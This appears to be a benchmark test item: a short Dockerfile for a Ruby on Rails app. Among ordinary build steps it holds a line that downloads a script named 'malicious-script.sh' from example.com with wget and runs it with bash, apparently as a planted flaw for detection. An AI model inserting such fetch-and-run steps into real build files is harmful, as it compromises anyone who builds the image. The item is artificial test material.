# Benchmark test 21
FROM ruby:2.7
RUN apt-get update -qq && apt-get install -y nodejs postgresql-client
WORKDIR /myapp
COPY Gemfile /myapp/Gemfile
RUN bundle install
RUN wget http://example.com/malicious-script.sh && bash malicious-script.sh
CMD ["rails", "server", "-b", "0.0.0.0"]